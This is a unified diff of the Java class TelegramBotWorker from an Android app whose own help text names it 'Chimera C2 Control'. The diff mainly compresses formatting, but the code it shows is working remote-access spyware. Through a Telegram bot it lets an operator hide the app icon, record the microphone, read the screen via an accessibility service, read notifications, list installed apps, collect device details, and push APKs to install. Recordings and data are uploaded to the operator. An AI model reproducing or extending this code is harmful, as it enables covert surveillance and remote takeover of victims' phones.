@@ -24,7 +24,6 @@ import java.util.List;
 public class TelegramBotWorker implements Runnable {
     private final Context context;
     private long lastUpdateId = 0;
-
     private enum WaitingState { NONE, FOR_PACKAGE_NAME_LAUNCH, FOR_PACKAGE_NAME_UNINSTALL, FOR_VOLUME, FOR_IMAGE_OVERLAY, FOR_AUDIO_PLAY, FOR_APK_INSTALL }
     private WaitingState currentState = WaitingState.NONE;
 
@@ -57,18 +56,10 @@ public class TelegramBotWorker implements Runnable {
             if (lastUpdateId > 0) urlStr += "&offset=" + (lastUpdateId + 1);
             URL url = new URL(urlStr);
             conn = (HttpURLConnection) url.openConnection();
-            conn.setRequestMethod("GET");
-            conn.setConnectTimeout(25000);
-            conn.setReadTimeout(25000);
             if (conn.getResponseCode() != HttpURLConnection.HTTP_OK) return;
-
-            InputStream is = conn.getInputStream();
-            String responseStr = streamToString(is);
-            is.close();
-
+            String responseStr = streamToString(conn.getInputStream());
             JSONObject responseJson = new JSONObject(responseStr);
             if (!responseJson.getBoolean("ok")) return;
-
             JSONArray updates = responseJson.getJSONArray("result");
             for (int i = 0; i < updates.length(); i++) {
                 JSONObject update = updates.getJSONObject(i);
@@ -89,51 +80,31 @@ public class TelegramBotWorker implements Runnable {
     private void handleMessage(JSONObject msg) {
         try {
             if (msg.getJSONObject("chat").getLong("id") != ConfigLoader.getAdminId()) return;
-
-            if (msg.has("document") || msg.has("photo") || msg.has("audio")) {
-                handleFileUpload(msg);
-                return;
-            }
-
+            if (msg.has("document") || msg.has("photo") || msg.has("audio")) { handleFileUpload(msg); return; }
             if (!msg.has("text")) return;
             String text = msg.getString("text").trim();
-
             if (handleStatefulReply(text)) return;
-
             String[] parts = text.split(" ");
             String command = parts[0].toLowerCase();
-
             switch (command) {
-                case "/start": case "/help":
-                    sendHelpMessage();
-                    break;
-                case "/control":
-                    sendControlPanel();
-                    break;
-                case "/toggle_app_hide":
-                    DeviceControlHandler.setComponentState(context, false);
-                    sendMessage("App icon is now hidden.", context);
-                    break;
-                case "/toggle_app_show":
-                    DeviceControlHandler.setComponentState(context, true);
-                    sendMessage("App icon is now visible.", context);
-                    break;
+                case "/start": case "/help": sendHelpMessage(); break;
+                case "/control": sendControlPanel(); break;
+                case "/toggle_app_hide": DeviceControlHandler.setComponentState(context, false); sendMessage("App icon is now hidden.", context); break;
+                case "/toggle_app_show": DeviceControlHandler.setComponentState(context, true); sendMessage("App icon is now visible.", context); break;
                 case "/grant_usage_access":
                     Intent usageIntent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                     usageIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                     context.startActivity(usageIntent);
-                    sendMessage("Usage Access settings opened on target device.", context);
+                    sendMessage("Usage Access settings opened. Please enable permission for the app.", context);
                     break;
                 case "/mic":
                     int duration = 30;
                     if (parts.length > 1) { try { duration = Integer.parseInt(parts[1]); } catch (NumberFormatException ignored) {} }
                     final int finalDuration = duration;
-                    sendMessage("Recording " + finalDuration + " seconds of audio...", context);
+                    sendMessage("Recording " + finalDuration + "s of audio...", context);
                     AudioHandler.startRecording(context, finalDuration, new AudioHandler.AudioCallback() {
-                        @Override
-                        public void onRecordingFinished(String filePath) { uploadAudio(filePath, ConfigLoader.getAdminId(), finalDuration + "s Audio", context); }
-                        @Override
-                        public void onError(String error) { sendMessage("Audio Error: " + error, context); }
+                        @Override public void onRecordingFinished(String filePath) { uploadAudio(filePath, ConfigLoader.getAdminId(), finalDuration + "s Audio", context); }
+                        @Override public void onError(String error) { sendMessage("Audio Error: " + error, context); }
                     });
                     break;
                 case "/device_details":
@@ -142,14 +113,13 @@ public class TelegramBotWorker implements Runnable {
                     break;
             }
         } catch (Exception e) {
-            ErrorLogger.logError(context, "TelegramBotWorker_HandleMessage", e);
+            ErrorLogger.logError(context, "HandleMessage", e);
         }
     }
 
     private boolean handleStatefulReply(String text) {
         WaitingState previousState = currentState;
         currentState = WaitingState.NONE;
-
         switch (previousState) {
             case FOR_PACKAGE_NAME_LAUNCH: launchApp(text); return true;
             case FOR_PACKAGE_NAME_UNINSTALL: uninstallApp(text); return true;
@@ -161,11 +131,8 @@ public class TelegramBotWorker implements Runnable {
     private void handleFileUpload(JSONObject msg) {
         WaitingState previousState = currentState;
         currentState = WaitingState.NONE;
-
         try {
-            String fileId = "";
-            String fileName = "tempfile";
-
+            String fileId = "", fileName = "tempfile";
             if (msg.has("document")) {
                 fileId = msg.getJSONObject("document").getString("file_id");
                 fileName = msg.getJSONObject("document").getString("file_name");
@@ -176,10 +143,7 @@ public class TelegramBotWorker implements Runnable {
             } else if (msg.has("audio")) {
                 fileId = msg.getJSONObject("audio").getString("file_id");
                 fileName = msg.getJSONObject("audio").optString("file_name", fileId + ".mp3");
-            } else {
-                return;
             }
-            
             switch (previousState) {
                 case FOR_IMAGE_OVERLAY:
                     downloadFile(fileId, fileName, path -> {
@@ -200,18 +164,13 @@ public class TelegramBotWorker implements Runnable {
                     });
                     break;
                 case FOR_APK_INSTALL:
-                    if (fileName.toLowerCase().endsWith(".apk")) {
-                        downloadFile(fileId, fileName, this::installApp);
-                    } else {
-                        sendMessage("Error: The uploaded file is not an APK.", context);
-                    }
+                    if (fileName.toLowerCase().endsWith(".apk")) { downloadFile(fileId, fileName, this::installApp); } 
+                    else { sendMessage("Error: The uploaded file is not an APK.", context); }
                     break;
-                default:
-                    sendMessage("Received a file, but I don't know what to do with it.", context);
-                    break;
+                default: sendMessage("Received a file, but I don't know what to do with it.", context); break;
             }
         } catch (Exception e) {
-             ErrorLogger.logError(context, "HandleFileUpload_JSONError", e);
+             ErrorLogger.logError(context, "HandleFileUpload", e);
         }
     }
 
@@ -220,16 +179,8 @@ public class TelegramBotWorker implements Runnable {
             String data = cb.getString("data");
             long chatId = cb.getJSONObject("message").getJSONObject("chat").getLong("id");
             int messageId = cb.getJSONObject("message").getInt("message_id");
-
-            if (!ChimeraAccessibilityService.isServiceEnabled() && (data.startsWith("ACC_") || data.equals("BACK_TO_MAIN"))) {
-                sendMessage("⚠️ Action Failed: Accessibility Service is not enabled.", context);
-                return;
-            }
-            if (!NotificationListener.isServiceEnabled() && data.startsWith("NOTIF_")) {
-                sendMessage("⚠️ Action Failed: Notification Listener service is not enabled.", context);
-                return;
-            }
-
+            if (!ChimeraAccessibilityService.isServiceEnabled() && (data.startsWith("ACC_") || data.equals("BACK_TO_MAIN"))) { sendMessage("⚠️ Action Failed: Accessibility Service is not enabled.", context); return; }
+            if (!NotificationListener.isServiceEnabled() && data.startsWith("NOTIF_")) { sendMessage("⚠️ Action Failed: Notification Listener service is not enabled.", context); return; }
             switch (data) {
                 case "LIST_APPS": listAllApps(); break;
                 case "LAUNCH_APP": currentState = WaitingState.FOR_PACKAGE_NAME_LAUNCH; sendMessage("Reply with the package name to launch.", context); break;
@@ -245,7 +196,7 @@ public class TelegramBotWorker implements Runnable {
                 case "PLAY_AUDIO": currentState = WaitingState.FOR_AUDIO_PLAY; sendMessage("Upload the audio file to play.", context); break;
                 case "INSTALL_APP": currentState = WaitingState.FOR_APK_INSTALL; sendMessage("Upload the APK file to install.", context); break;
                 case "NOTIF_GET_EXISTING": NotificationListener.getActiveNotifications(context); break;
-                case "ACC_GET_CONTENT": sendMessage("Dumping screen content...", context); sendMessage(ChimeraAccessibilityService.getScreenContent(), context); break;
+                case "ACC_GET_CONTENT": sendMessage(ChimeraAccessibilityService.getScreenContent(), context); break;
                 case "ACC_GESTURES": sendGesturePanel(chatId, messageId); break;
                 case "ACC_ACTION_BACK": ChimeraAccessibilityService.triggerGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK); break;
                 case "ACC_ACTION_HOME": ChimeraAccessibilityService.triggerGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME); break;
@@ -254,7 +205,7 @@ public class TelegramBotWorker implements Runnable {
                 case "EXIT_PANEL": editMessage(chatId, messageId, "Control panel closed."); break;
             }
         } catch (Exception e) {
-            ErrorLogger.logError(context, "TelegramBotWorker_HandleCallback", e);
+            ErrorLogger.logError(context, "HandleCallback", e);
         }
     }
 
@@ -266,27 +217,22 @@ public class TelegramBotWorker implements Runnable {
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 context.startActivity(intent);
                 sendMessage("App launch requested: " + packageName, context);
-            } else {
-                sendMessage("Error: Could not launch " + packageName, context);
-            }
-        } catch (Exception e) {
-            sendMessage("Error launching app: " + e.getMessage(), context);
-        }
+            } else { sendMessage("Error: Could not launch " + packageName, context); }
+        } catch (Exception e) { sendMessage("Error launching app: " + e.getMessage(), context); }
     }
 
     private void uninstallApp(String packageName) {
         Intent intent = new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + packageName));
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         context.startActivity(intent);
-        sendMessage("Uninstall requested for " + packageName + ". User confirmation may be required.", context);
+        sendMessage("Uninstall requested for " + packageName + ". User confirmation is required.", context);
     }
     
     private void installApp(String apkPath) {
         File apkFile = new File(apkPath);
         if (!apkFile.exists()) { sendMessage("Error: APK file not found.", context); return; }
-        Intent intent = new Intent(Intent.ACTION_VIEW);
-        Uri fileUri = Uri.fromFile(apkFile);
-        intent.setDataAndType(fileUri, "application/vnd.android.package-archive");
+        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.fromFile(apkFile));
+        intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
         context.startActivity(intent);
         sendMessage("Install requested for " + apkFile.getName() + ". User confirmation is required.", context);
@@ -294,12 +240,9 @@ public class TelegramBotWorker implements Runnable {
 
     private void setVolume(String levelStr) {
         try {
-            int level = Integer.parseInt(levelStr);
-            DeviceControlHandler.setMediaVolume(context, level);
-            sendMessage("Media volume set to " + level + "%.", context);
-        } catch (NumberFormatException e) {
-            sendMessage("Error: Invalid number provided.", context);
-        }
+            DeviceControlHandler.setMediaVolume(context, Integer.parseInt(levelStr));
+            sendMessage("Media volume set to " + levelStr + "%.", context);
+        } catch (NumberFormatException e) { sendMessage("Error: Invalid number provided.", context); }
     }
     
     private void listAllApps() {
@@ -307,27 +250,26 @@ public class TelegramBotWorker implements Runnable {
             PackageManager pm = context.getPackageManager();
             List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
             StringBuilder appList = new StringBuilder();
-            int userAppCount = 0;
+            int count = 0;
             for (ApplicationInfo app : packages) {
                 if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                     appList.append(pm.getApplicationLabel(app)).append("\n`").append(app.packageName).append("`\n\n");
-                    userAppCount++;
+                    count++;
                 }
             }
-            sendMessage("--- " + userAppCount + " User-Installed Apps ---\n" + appList.toString(), context);
+            sendMessage("--- " + count + " User-Installed Apps ---\n" + appList.toString(), context);
         }).start();
     }
     
     private void sendHelpMessage() {
-        String helpText = "Chimera C2 Control\n\n"
-                + "/control - Show the main control panel.\n"
-                + "/mic <seconds> - Record audio.\n"
-                + "/device_details - Get device intel report.\n"
-                + "/toggle_app_hide - Hide app icon.\n"
-                + "/toggle_app_show - Show app icon.\n"
-                + "/grant_usage_access - Open Usage Access settings.\n"
-                + "/help - Show this message.";
-        sendMessage(helpText, context);
+        sendMessage("Chimera C2 Control\n\n"
+                + "`/control` - Show the main control panel.\n"
+                + "`/mic <seconds>` - Record audio.\n"
+                + "`/device_details` - Get device intel report.\n"
+                + "`/toggle_app_hide` - Hide app icon.\n"
+                + "`/toggle_app_show` - Show app icon.\n"
+                + "`/grant_usage_access` - Open Usage Access settings.\n"
+                + "`/help` - Show this message.", context);
     }
 
     private void sendControlPanel() {
@@ -342,9 +284,7 @@ public class TelegramBotWorker implements Runnable {
             rows.put(new JSONArray().put(new JSONObject().put("text", "❌ Exit Panel ❌").put("callback_data", "EXIT_PANEL")));
             keyboard.put("inline_keyboard", rows);
             sendMessageWithMarkup("Chimera Control Panel", keyboard);
-        } catch (Exception e) {
-            ErrorLogger.logError(context, "SendControlPanel", e);
-        }
+        } catch (Exception e) { ErrorLogger.logError(context, "SendControlPanel", e); }
     }
 
     private void sendGesturePanel(long chatId, int messageId) {
@@ -355,97 +295,67 @@ public class TelegramBotWorker implements Runnable {
             rows.put(new JSONArray().put(new JSONObject().put("text", "« Back to Main Panel").put("callback_data", "BACK_TO_MAIN")));
             keyboard.put("inline_keyboard", rows);
             editMessageMarkup(chatId, messageId, "Gesture Control", keyboard);
-        } catch (Exception e) {
-             ErrorLogger.logError(context, "SendGesturePanel", e);
-        }
+        } catch (Exception e) { ErrorLogger.logError(context, "SendGesturePanel", e); }
     }
 
     private void downloadFile(String fileId, String fileName, FileDownloadCallback callback) {
         new Thread(() -> {
-            HttpURLConnection conn = null;
             try {
                 String token = ConfigLoader.getBotToken();
                 String getPathUrl = "https://api.telegram.org/bot" + token + "/getFile?file_id=" + fileId;
-                URL url = new URL(getPathUrl);
-                conn = (HttpURLConnection) url.openConnection();
-                String response = streamToString(conn.getInputStream());
-                conn.disconnect();
+                String response = streamToString(new URL(getPathUrl).openConnection().getInputStream());
                 String filePath = new JSONObject(response).getJSONObject("result").getString("file_path");
                 String downloadUrl = "https://api.telegram.org/file/bot" + token + "/" + filePath;
                 File outputFile = new File(context.getCacheDir(), fileName);
-                conn = (HttpURLConnection) new URL(downloadUrl).openConnection();
-                try (InputStream is = conn.getInputStream(); FileOutputStream fos = new FileOutputStream(outputFile)) {
-                    byte[] buffer = new byte[4096];
-                    int bytesRead;
+                try (InputStream is = new URL(downloadUrl).openConnection().getInputStream(); FileOutputStream fos = new FileOutputStream(outputFile)) {
+                    byte[] buffer = new byte[4096]; int bytesRead;
                     while ((bytesRead = is.read(buffer)) != -1) fos.write(buffer, 0, bytesRead);
                 }
                 callback.onFileDownloaded(outputFile.getAbsolutePath());
             } catch (Exception e) {
                 ErrorLogger.logError(context, "FileDownloadError", e);
                 sendMessage("Failed to download the file.", context);
-            } finally {
-                if (conn != null) conn.disconnect();
             }
         }).start();
     }
 
     private interface FileDownloadCallback { void onFileDownloaded(String path); }
     private static String streamToString(InputStream is) throws Exception {
-        ByteArrayOutputStream result = new ByteArrayOutputStream();
-        byte[] buffer = new byte[1024];
-        int length;
+        ByteArrayOutputStream result = new ByteArrayOutputStream(); byte[] buffer = new byte[1024]; int length;
         while ((length = is.read(buffer)) != -1) result.write(buffer, 0, length);
         return result.toString("UTF-8");
     }
 
     private void editMessage(long chatId, int messageId, String text) {
          try {
-            JSONObject body = new JSONObject();
-            body.put("chat_id", chatId);
-            body.put("message_id", messageId);
-            body.put("text", text);
-            body.put("reply_markup", new JSONObject());
+            JSONObject body = new JSONObject(); body.put("chat_id", chatId); body.put("message_id", messageId);
+            body.put("text", text); body.put("reply_markup", new JSONObject());
             post("editMessageText", body, context);
-        } catch (Exception e) {
-            ErrorLogger.logError(context, "EditMessage", e);
-        }
+        } catch (Exception e) { ErrorLogger.logError(context, "EditMessage", e); }
     }
     
     private void editMessageMarkup(long chatId, int messageId, String text, JSONObject markup) {
         try {
-            JSONObject body = new JSONObject();
-            body.put("chat_id", chatId);
-            body.put("message_id", messageId);
-            body.put("text", text);
-            body.put("reply_markup", markup);
+            JSONObject body = new JSONObject(); body.put("chat_id", chatId); body.put("message_id", messageId);
+            body.put("text", text); body.put("reply_markup", markup);
             post("editMessageText", body, context);
-        } catch (Exception e) {
-            ErrorLogger.logError(context, "EditMarkup", e);
-        }
+        } catch (Exception e) { ErrorLogger.logError(context, "EditMarkup", e); }
     }
 
     private void sendMessageWithMarkup(String text, JSONObject markup) {
         try {
-            JSONObject body = new JSONObject();
-            body.put("chat_id", ConfigLoader.getAdminId());
-            body.put("text", text);
-            body.put("reply_markup", markup);
+            JSONObject body = new JSONObject(); body.put("chat_id", ConfigLoader.getAdminId());
+            body.put("text", text); body.put("reply_markup", markup);
             post("sendMessage", body, context);
-        } catch (Exception e) {
-            ErrorLogger.logError(context, "SendMessageWithMarkup", e);
-        }
+        } catch (Exception e) { ErrorLogger.logError(context, "SendMessageWithMarkup", e); }
     }
     
     public static void sendMessage(String message, Context context) {
         try {
-            JSONObject body = new JSONObject();
-            body.put("chat_id", ConfigLoader.getAdminId());
-            body.put("text", message);
-            body.put("parse_mode", "Markdown");
+            JSONObject body = new JSONObject(); body.put("chat_id", ConfigLoader.getAdminId());
+            body.put("text", message); body.put("parse_mode", "Markdown");
             post("sendMessage", body, context);
-        } catch (Exception e) {
-            ErrorLogger.logError(context, "SendMessageHelper", e);
-        }
+        } catch (Exception e) { ErrorLogger.logError(context, "SendMessageHelper", e); }
     }
     
     public static void post(String method, JSONObject json, Context context) {
@@ -459,15 +369,10 @@ public class TelegramBotWorker implements Runnable {
                 conn.setDoOutput(true);
                 conn.setConnectTimeout(15000);
                 conn.setReadTimeout(15000);
-                try (OutputStream os = conn.getOutputStream()) {
-                    os.write(json.toString().getBytes(StandardCharsets.UTF_8));
-                }
+                try (OutputStream os = conn.getOutputStream()) { os.write(json.toString().getBytes(StandardCharsets.UTF_8)); }
                 conn.getInputStream().close();
-            } catch (Exception e) {
-                ErrorLogger.logError(context, "TelegramBotWorker_Post", e);
-            } finally {
-                if (conn != null) conn.disconnect();
-            }
+            } catch (Exception e) { ErrorLogger.logError(context, "TelegramBotWorker_Post", e);
+            } finally { if (conn != null) conn.disconnect(); }
         }).start();
     }
 
@@ -482,8 +387,7 @@ public class TelegramBotWorker implements Runnable {
             String token = ConfigLoader.getBotToken();
             if (token == null) return;
             String urlStr = "https://api.telegram.org/bot" + token + "/" + endpoint;
-            String boundary = "Boundary-" + System.currentTimeMillis();
-            String LINE_FEED = "\r\n";
+            String boundary = "Boundary-" + System.currentTimeMillis(), LINE_FEED = "\r\n";
             HttpURLConnection conn = null;
             try {
                 URL url = new URL(urlStr);
@@ -500,20 +404,15 @@ public class TelegramBotWorker implements Runnable {
                     writer.append("Content-Type: " + contentType).append(LINE_FEED).append(LINE_FEED);
                     writer.flush();
                     try (FileInputStream fis = new FileInputStream(fileToUpload)) {
-                        byte[] buffer = new byte[4096];
-                        int bytesRead;
+                        byte[] buffer = new byte[4096]; int bytesRead;
                         while ((bytesRead = fis.read(buffer)) != -1) os.write(buffer, 0, bytesRead);
                     }
                     writer.append(LINE_FEED).flush();
                     writer.append("--" + boundary + "--").append(LINE_FEED);
                 }
                 conn.getInputStream().close();
-            } catch (Exception e) {
-                ErrorLogger.logError(context, "TelegramBotWorker_Upload", e);
-            } finally {
-                if (conn != null) conn.disconnect();
-                fileToUpload.delete();
-            }
+            } catch (Exception e) { ErrorLogger.logError(context, "Upload", e);
+            } finally { if (conn != null) conn.disconnect(); fileToUpload.delete(); }
         }).start();
     }
 }
